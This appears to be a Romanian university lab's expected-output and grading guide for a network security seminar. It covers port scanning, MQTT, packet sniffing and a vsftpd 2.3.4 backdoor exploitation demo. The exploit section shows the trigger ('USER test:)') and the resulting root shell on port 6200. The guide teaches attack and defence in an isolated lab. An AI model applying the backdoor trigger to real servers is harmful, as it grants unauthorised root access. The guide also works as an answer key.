# Expected Outputs - Seminar 13: Securitate în Rețele
## Ghid de Evaluare pentru Rezultate

**Curs**: Rețele de Calculatoare  
**Săptămâna**: 13 - IoT și Securitate  
**Document**: Referință pentru evaluare și autoevaluare

---

## Cuprins

1. [Exercițiul 1: Port Scanner](#exercițiul-1-port-scanner)
2. [Exercițiul 2: MQTT Client](#exercițiul-2-mqtt-client)
3. [Exercițiul 3: Packet Sniffer](#exercițiul-3-packet-sniffer)
4. [Exercițiul 4: Vulnerability Checker](#exercițiul-4-vulnerability-checker)
5. [Exploit: vsftpd Backdoor](#exploit-vsftpd-backdoor)
6. [Banner Grabber](#banner-grabber)
7. [Report Generator](#report-generator)
8. [Demo Defensive](#demo-defensive)
9. [Criterii de Evaluare](#criterii-de-evaluare)

---

## Exercițiul 1: Port Scanner

### Comanda de Test

```bash
python python/exercises/ex_01_port_scanner.py 172.20.0.10 -p 80,443,8080,8888 -v
```

### Output Așteptat (DVWA)

```
╔═══════════════════════════════════════════════════════════════╗
║                     PORT SCANNER v1.0                          ║
║                 Rețele de Calculatoare S13                     ║
╚═══════════════════════════════════════════════════════════════╝

[*] Target: 172.20.0.10
[*] Ports: 80, 443, 8080, 8888
[*] Threads: 50
[*] Timeout: 1.0s

[*] Starting scan...

[+] 172.20.0.10:80     OPEN     http
[+] 172.20.0.10:8888   OPEN     unknown (mapped to 80)
[-] 172.20.0.10:443    CLOSED
[-] 172.20.0.10:8080   CLOSED

════════════════════════════════════════════════════════════════
                         SCAN RESULTS                            
════════════════════════════════════════════════════════════════
Target:     172.20.0.10
Start:      2025-01-15 10:30:00
Duration:   2.34 seconds
────────────────────────────────────────────────────────────────
Open:       2
Closed:     2
Filtered:   0
────────────────────────────────────────────────────────────────
```

### Output Așteptat (vsftpd)

```bash
python python/exercises/ex_01_port_scanner.py 172.20.0.12 -p 21,22,6200 -v
```

```
[+] 172.20.0.12:21     OPEN     ftp
[+] 172.20.0.12:6200   OPEN     unknown (backdoor port!)
[-] 172.20.0.12:22     CLOSED
```

### Criterii de Evaluare

| Criteriu | Punctaj | Descriere |
|----------|---------|-----------|
| Detectare corectă porturi deschise | 3p | Toate porturile open identificate |
| Format output corect | 1p | Afișare structurată, lizibilă |
| Raportare statistici | 1p | Durată, contoare, timestamp |
| Export JSON funcțional | 1p | Fișier JSON valid generat |

---

## Exercițiul 2: MQTT Client

### Comanda de Test - Publisher

```bash
python python/exercises/ex_02_mqtt_client.py \
    --broker localhost --port 1883 \
    --mode sensor --topic "iot/sensor/temp" \
    --count 5
```

### Output Așteptat - Publisher

```
╔═══════════════════════════════════════════════════════════════╗
║                     MQTT CLIENT v1.0                           ║
║                 IoT Communication Demo                         ║
╚═══════════════════════════════════════════════════════════════╝

[*] Mode: SENSOR (Publisher)
[*] Broker: localhost:1883
[*] Topic: iot/sensor/temp
[*] TLS: Disabled

[+] Connected to broker
[*] Publishing sensor data...

[PUB] iot/sensor/temp → {"sensor_id": "sensor_001", "temperature": 23.5, "timestamp": "2025-01-15T10:30:00Z"}
[PUB] iot/sensor/temp → {"sensor_id": "sensor_001", "temperature": 24.1, "timestamp": "2025-01-15T10:30:01Z"}
[PUB] iot/sensor/temp → {"sensor_id": "sensor_001", "temperature": 23.8, "timestamp": "2025-01-15T10:30:02Z"}
[PUB] iot/sensor/temp → {"sensor_id": "sensor_001", "temperature": 24.3, "timestamp": "2025-01-15T10:30:03Z"}
[PUB] iot/sensor/temp → {"sensor_id": "sensor_001", "temperature": 23.9, "timestamp": "2025-01-15T10:30:04Z"}

[*] Published 5 messages
[*] Disconnecting...
```

### Output Așteptat - Subscriber (Dashboard)

```bash
python python/exercises/ex_02_mqtt_client.py \
    --broker localhost --port 1883 \
    --mode dashboard --topic "iot/sensor/#"
```

```
[*] Mode: DASHBOARD (Subscriber)
[*] Subscribed to: iot/sensor/#
[*] Waiting for messages... (Ctrl+C to exit)

[SUB] iot/sensor/temp ← {"sensor_id": "sensor_001", "temperature": 23.5, ...}
      └─ Temperature: 23.5°C | Time: 10:30:00

[SUB] iot/sensor/temp ← {"sensor_id": "sensor_001", "temperature": 24.1, ...}
      └─ Temperature: 24.1°C | Time: 10:30:01
```

### Criterii de Evaluare

| Criteriu | Punctaj | Descriere |
|----------|---------|-----------|
| Conexiune MQTT funcțională | 2p | Connect/disconnect fără erori |
| Publish mesaje | 2p | Mesaje trimise corect pe topic |
| Subscribe și recepție | 2p | Mesaje primite și afișate |
| Format JSON valid | 1p | Payload structurat corect |
| TLS (bonus) | +1p | Conexiune securizată funcțională |

---

## Exercițiul 3: Packet Sniffer

### Comanda de Test

```bash
sudo python python/exercises/ex_03_packet_sniffer.py \
    --interface docker0 \
    --filter "tcp port 21" \
    --count 10 \
    --verbose
```

### Output Așteptat

```
╔═══════════════════════════════════════════════════════════════╗
║                    PACKET SNIFFER v1.0                         ║
║                 Network Traffic Analyzer                       ║
╚═══════════════════════════════════════════════════════════════╝

[*] Interface: docker0
[*] Filter: tcp port 21
[*] Capture count: 10

[*] Starting capture... (Ctrl+C to stop)

────────────────────────────────────────────────────────────────
Packet #1 | 2025-01-15 10:35:00.123456
────────────────────────────────────────────────────────────────
  Ethernet: 02:42:ac:14:00:01 → 02:42:ac:14:00:0c
  IP:       172.20.0.1 → 172.20.0.12
  TCP:      45678 → 21 [SYN] Seq=0 Win=64240
  Protocol: FTP (Connection initiation)

────────────────────────────────────────────────────────────────
Packet #2 | 2025-01-15 10:35:00.124567
────────────────────────────────────────────────────────────────
  Ethernet: 02:42:ac:14:00:0c → 02:42:ac:14:00:01
  IP:       172.20.0.12 → 172.20.0.1
  TCP:      21 → 45678 [SYN, ACK] Seq=0 Ack=1 Win=65535
  Protocol: FTP (Connection response)

────────────────────────────────────────────────────────────────
Packet #3 | 2025-01-15 10:35:00.125678
────────────────────────────────────────────────────────────────
  Ethernet: 02:42:ac:14:00:0c → 02:42:ac:14:00:01
  IP:       172.20.0.12 → 172.20.0.1
  TCP:      21 → 45678 [PSH, ACK]
  Payload:  220 (vsFTPd 2.3.4)\r\n
  Protocol: FTP Banner

════════════════════════════════════════════════════════════════
                      CAPTURE STATISTICS                         
════════════════════════════════════════════════════════════════
Packets captured:  10
Duration:          5.23 seconds
Packets/sec:       1.91

Protocol distribution:
  TCP:   10 (100.0%)
  
Port distribution:
  21:    10 (100.0%)
════════════════════════════════════════════════════════════════
```

### Criterii de Evaluare

| Criteriu | Punctaj | Descriere |
|----------|---------|-----------|
| Captură funcțională | 2p | Pachete capturate corect |
| Parsare headere | 2p | Ethernet, IP, TCP extrase |
| Afișare payload | 1p | Conținut vizibil pentru plaintext |
| Statistici | 1p | Contoare și distribuție |
| Export PCAP (bonus) | +1p | Salvare pentru Wireshark |

---

## Exercițiul 4: Vulnerability Checker

### Comanda de Test

```bash
python python/exercises/ex_04_vuln_checker.py \
    --target 172.20.0.12 \
    --port 21 \
    --service ftp \
    --verbose
```

### Output Așteptat

```
╔═══════════════════════════════════════════════════════════════╗
║                 VULNERABILITY CHECKER v1.0                     ║
║                   Security Assessment Tool                     ║
╚═══════════════════════════════════════════════════════════════╝

[*] Target: 172.20.0.12:21
[*] Service: FTP
[*] Starting vulnerability assessment...

────────────────────────────────────────────────────────────────
                      SERVICE DETECTION                          
────────────────────────────────────────────────────────────────
[+] Port 21 is OPEN
[+] Banner: 220 (vsFTPd 2.3.4)
[+] Service: vsftpd
[+] Version: 2.3.4

────────────────────────────────────────────────────────────────
                    VULNERABILITY ANALYSIS                       
────────────────────────────────────────────────────────────────

[!] CRITICAL VULNERABILITY DETECTED

╔═══════════════════════════════════════════════════════════════╗
║  CVE-2011-2523 - vsftpd 2.3.4 Backdoor                        ║
╠═══════════════════════════════════════════════════════════════╣
║  Severity:    CRITICAL                                         ║
║  CVSS Score:  10.0 / 10.0                                      ║
║  Type:        Remote Code Execution                            ║
║  Access:      Network (no authentication required)             ║
╠═══════════════════════════════════════════════════════════════╣
║  Description:                                                  ║
║  vsftpd 2.3.4 downloaded from the master site has been        ║
║  compromised to contain a backdoor. When triggered by a       ║
║  username containing ":)", the server opens a shell on        ║
║  port 6200.                                                   ║
╠═══════════════════════════════════════════════════════════════╣
║  Impact:                                                       ║
║  - Complete system compromise                                  ║
║  - Root access to server                                       ║
║  - Data exfiltration                                          ║
║  - Lateral movement in network                                 ║
╠═══════════════════════════════════════════════════════════════╣
║  Remediation:                                                  ║
║  1. Immediately upgrade to vsftpd >= 2.3.5                    ║
║  2. Block port 6200 on firewall                               ║
║  3. Audit system for signs of compromise                      ║
║  4. Review network segmentation                                ║
╚═══════════════════════════════════════════════════════════════╝

────────────────────────────────────────────────────────────────
                      ADDITIONAL CHECKS                          
────────────────────────────────────────────────────────────────
[*] Checking backdoor port 6200...
[!] Port 6200 is OPEN - Backdoor may be active!

[*] Checking anonymous login...
[+] Anonymous FTP: ENABLED (potential data exposure)

────────────────────────────────────────────────────────────────
                         SUMMARY                                 
────────────────────────────────────────────────────────────────
Critical:  1
High:      0
Medium:    1 (Anonymous FTP)
Low:       0

Recommendation: IMMEDIATE ACTION REQUIRED
```

### Criterii de Evaluare

| Criteriu | Punctaj | Descriere |
|----------|---------|-----------|
| Detectare serviciu | 1p | Banner și versiune identificate |
| Lookup CVE | 2p | Vulnerabilitate găsită în bază |
| Scoring CVSS | 1p | Severitate calculată corect |
| Recomandări | 1p | Măsuri de remediere oferite |
| Format raport | 1p | Structurat, profesional |

---

## Exploit: vsftpd Backdoor

### Comanda de Test

```bash
python python/exploits/ftp_backdoor_vsftpd.py 172.20.0.12 \
    --port 2121 \
    --command "id && hostname && uname -a"
```

### Output Așteptat

```
╔═══════════════════════════════════════════════════════════════╗
║            vsftpd 2.3.4 Backdoor Exploit                       ║
║                   CVE-2011-2523                                ║
╚═══════════════════════════════════════════════════════════════╝

[*] Target: 172.20.0.12:2121
[*] Connecting to FTP service...
[+] Connected!
[+] Banner: 220 (vsFTPd 2.3.4)

[*] Version 2.3.4 detected - vulnerable!

[*] Phase 1: Triggering backdoor...
[*] Sending: USER test:)
[+] Trigger sent!

[*] Phase 2: Waiting for backdoor port...
[*] Checking port 6200...
[+] Backdoor port 6200 is OPEN!

[*] Phase 3: Connecting to backdoor shell...
[+] Shell connection established!

════════════════════════════════════════════════════════════════
                       SHELL ACCESS                              
════════════════════════════════════════════════════════════════

[*] Executing: id && hostname && uname -a

uid=0(root) gid=0(root) groups=0(root)
vsftpd-container
Linux vsftpd-container 5.15.0-91-generic #101-Ubuntu SMP x86_64 GNU/Linux

════════════════════════════════════════════════════════════════

[*] Exploit completed successfully
[!] WARNING: This demonstrates a critical vulnerability
[!] Remediation: Upgrade vsftpd immediately!
```

### Criterii de Evaluare

| Criteriu | Punctaj | Descriere |
|----------|---------|-----------|
| Conectare FTP | 1p | Handshake complet |
| Trigger backdoor | 2p | Activare corectă cu `:)` |
| Conectare shell | 2p | Acces pe port 6200 |
| Execuție comandă | 2p | Output primit |
| Documentare etică | 1p | Avertismente incluse |

---

## Banner Grabber

### Comanda de Test

```bash
python python/exploits/banner_grabber.py 172.20.0.12 -p 21,22,80
```

### Output Așteptat

```
╔═══════════════════════════════════════════════════════════════╗
║                    BANNER GRABBER v1.0                         ║
╚═══════════════════════════════════════════════════════════════╝

[*] Target: 172.20.0.12
[*] Ports: 21, 22, 80

────────────────────────────────────────────────────────────────
Port 21 (FTP)
────────────────────────────────────────────────────────────────
  Status:   OPEN
  Banner:   220 (vsFTPd 2.3.4)
  Service:  vsftpd
  Version:  2.3.4
  Risk:     CRITICAL - Known backdoor (CVE-2011-2523)

────────────────────────────────────────────────────────────────
Port 22 (SSH)
────────────────────────────────────────────────────────────────
  Status:   CLOSED

────────────────────────────────────────────────────────────────
Port 80 (HTTP)
────────────────────────────────────────────────────────────────
  Status:   CLOSED

════════════════════════════════════════════════════════════════
                         SUMMARY                                 
════════════════════════════════════════════════════════════════
  Scanned:  3 ports
  Open:     1
  Banners:  1

  Vulnerabilities detected: 1 CRITICAL
```

---

## Report Generator

### Comanda de Test

```bash
python python/utils/report_generator.py \
    --scan-results results/scan_*.json \
    --vuln-results results/vuln_report.json \
    --output results/final_report \
    --format html,md,json \
    --title "Security Assessment S13"
```

### Output Așteptat (Consola)

```
╔═══════════════════════════════════════════════════════════════╗
║                   REPORT GENERATOR v1.0                        ║
╚═══════════════════════════════════════════════════════════════╝

[*] Loading scan results...
    ├─ results/scan_dvwa.json (2 open ports)
    ├─ results/scan_vsftpd.json (2 open ports)
    └─ Total: 4 open ports

[*] Loading vulnerability results...
    └─ results/vuln_report.json (1 critical, 1 medium)

[*] Generating reports...
    ├─ HTML: results/final_report.html ✓
    ├─ Markdown: results/final_report.md ✓
    └─ JSON: results/final_report.json ✓

[+] Reports generated successfully!

════════════════════════════════════════════════════════════════
                      REPORT SUMMARY                             
════════════════════════════════════════════════════════════════
  Title:        Security Assessment S13
  Date:         2025-01-15
  Targets:      3
  
  Findings:
    Critical:   1
    High:       0
    Medium:     1
    Low:        0
    Info:       2
  
  Files:
    HTML (interactive):  results/final_report.html
    Markdown:            results/final_report.md
    JSON (raw data):     results/final_report.json
════════════════════════════════════════════════════════════════
```

### Structura HTML Generată

```html
<!-- Secțiuni așteptate în raportul HTML -->
1. Executive Summary
   - Overview
   - Risk Score
   - Key Findings

2. Methodology
   - Scope
   - Tools Used
   - Timeline

3. Findings
   - Critical (CVE-2011-2523)
   - Medium (Anonymous FTP)
   
4. Recommendations
   - Priority Matrix
   - Remediation Steps
   
5. Technical Details
   - Port Scan Results
   - Vulnerability Details
   - Evidence Screenshots

6. Appendix
   - Raw Data
   - Tool Outputs
```

---

## Demo Defensive

### Comanda de Test

```bash
./scripts/run_demo_defensive.sh --scenario all --verbose
```

### Output Așteptat

```
╔═══════════════════════════════════════════════════════════════╗
║              DEFENSIVE DEMO - S13 Security Lab                 ║
╚═══════════════════════════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  Scenario 1: Network Segmentation
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

[*] Testing IoT zone isolation...

Test: IoT → IoT (same zone)
  h1 ping h3: ✓ ALLOWED (expected)

Test: IoT → MGMT (cross zone)
  h1 ping h5: ✗ BLOCKED (expected)

Test: MGMT → IoT (admin access)
  h5 ping h1: ✓ ALLOWED (expected)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  Scenario 2: Lateral Movement Prevention
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

[*] Testing lateral movement blocks...

Test: sensor1 → sensor2 (SSH)
  Result: ✗ BLOCKED (expected)

Test: sensor1 → controller (MQTT)
  Result: ✓ ALLOWED (expected)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  Scenario 3: TLS Comparison
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

[*] MQTT Plain (port 1883):
    Packet capture: Payload VISIBLE
    Example: {"temp": 23.5}

[*] MQTT TLS (port 8883):
    Packet capture: Payload ENCRYPTED
    Example: [TLS Application Data]

════════════════════════════════════════════════════════════════
                    DEMONSTRATION COMPLETE                       
════════════════════════════════════════════════════════════════

Security Controls Verified:
  ✓ Network Segmentation
  ✓ Firewall Rules
  ✓ Lateral Movement Prevention
  ✓ Admin Access Control
  ✓ TLS Encryption
  ✓ Traffic Logging
```

---

## Criterii de Evaluare

### Structura Punctajului (Total: 10 puncte)

| Componentă | Punctaj | Detalii |
|------------|---------|---------|
| **Exerciții Python** | 4p | Funcționalitate completă |
| **Documentație rezultate** | 2p | REZULTATE_S13.txt complet |
| **Analiză trafic** | 2p | Capturi Wireshark relevante |
| **Întrebări reflecție** | 2p | Răspunsuri corecte și complete |

### Baremul Detaliat

#### Exercițiile Python (4 puncte)

- **Port Scanner** (1p)
  - 0.5p - Scanare funcțională
  - 0.5p - Output formatat corect

- **MQTT Client** (1p)
  - 0.5p - Publish funcțional
  - 0.5p - Subscribe funcțional

- **Vulnerability Checker** (1p)
  - 0.5p - Detectare versiune
  - 0.5p - Identificare CVE

- **Exploit Demo** (1p)
  - 1p - Demonstrație completă cu output

#### Documentație (2 puncte)

- **REZULTATE_S13.txt** (2p)
  - 0.5p - Informații complete student
  - 0.5p - Rezultate scanare
  - 0.5p - Banner grabbing documentat
  - 0.5p - Format profesional

#### Analiză Trafic (2 puncte)

- **Capturi Wireshark** (2p)
  - 1p - Captură FTP cu backdoor trigger
  - 0.5p - Identificare port 6200
  - 0.5p - Screenshot-uri clare

#### Întrebări Reflecție (2 puncte)

1. **De ce vsftpd 2.3.4 e periculos?** (0.5p)
   - Răspuns așteptat: Backdoor care oferă acces root neautorizat prin trigger `:)` pe portul 6200

2. **3 măsuri preventive** (1p)
   - Upgrade la versiune sigură
   - Blocare port 6200 pe firewall
   - Segmentare rețea IoT
   - Monitorizare trafic anormal
   - Dezactivare servicii nefolosite

3. **Diferența MQTT plain vs TLS** (0.5p)
   - Plain: Payload vizibil, interceptabil
   - TLS: Payload criptat, confidențialitate asigurată

---

## Exemple de Răspunsuri Model

### Întrebarea 1: Pericol vsftpd 2.3.4

**Răspuns complet (0.5p):**

> vsftpd 2.3.4 conține un backdoor malițios (CVE-2011-2523) introdus în codul sursă distribuit de pe site-ul oficial. Când un utilizator se autentifică cu un username care conține caracterele `:)`, serverul deschide automat un shell cu privilegii root pe portul 6200. Aceasta permite unui atacator să obțină control complet asupra sistemului fără autentificare validă.

### Întrebarea 2: Măsuri Preventive

**Răspuns complet (1p):**

> 1. **Upgrade imediat** - Actualizare la vsftpd versiunea 2.3.5 sau mai recentă care nu conține backdoor-ul
> 2. **Firewall** - Blocare port 6200 inbound și outbound pentru a preveni exploatarea chiar dacă vulnerabilitatea există
> 3. **Segmentare** - Izolarea serviciilor critice în VLAN-uri separate cu acces controlat
> 4. **Monitorizare** - Implementare IDS/IPS pentru detectarea pattern-urilor de atac (trigger `:)`)
> 5. **Principle of Least Privilege** - Rulare servicii cu privilegii minime necesare

### Întrebarea 3: MQTT Plain vs TLS

**Răspuns complet (0.5p):**

> - **MQTT Plain (port 1883)**: Traficul circulă necriptat, orice entitate pe rețea poate intercepta și citi mesajele (topic-uri, payload-uri, credențiale). Vulnerabil la atacuri Man-in-the-Middle.
> - **MQTT TLS (port 8883)**: Traficul este criptat end-to-end, asigurând confidențialitatea datelor. În Wireshark se vede doar handshake-ul TLS și "Application Data" criptat, fără posibilitatea de a citi conținutul.

---

*Document actualizat pentru Seminar 13 - Rețele de Calculatoare*  
*ASE București, CSIE, 2025-2026*
